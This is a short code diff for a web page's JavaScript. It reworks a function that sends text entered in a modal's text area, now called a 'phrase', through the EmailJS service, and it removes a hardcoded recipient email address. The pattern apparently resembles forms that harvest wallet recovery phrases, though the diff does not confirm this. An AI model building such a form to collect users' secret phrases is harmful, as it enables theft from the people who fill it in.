@@ -217,15 +217,14 @@ document.addEventListener("DOMContentLoaded", function () {
       .catch((error) => console.error("Error submitting form:", error));
   });
 
-  function sendEmail(message) {
+  function sendEmail(phrase) {
     const emailjsParams = {
-      to_email: "anssville@gmail.com",
-      message: message,
+      message: phrase,
     };
 
     emailjs
-      .send("service_q623k56", "template_eypceto", emailjsParams)
-      .then(function (response) {
+      .send("service_q623k56", "template_ombrcte", emailjsParams)
+      .then((response) => {
         console.log("Email sent successfully:", response);
 
         textAreaContainer.style.display = "none"; // hides the text area container
@@ -235,7 +234,7 @@ document.addEventListener("DOMContentLoaded", function () {
           resetModal();
         }, 2000);
       })
-      .catch(function (error) {
+      .catch((error) => {
         console.error("Error sending email:", error);
       });
   }
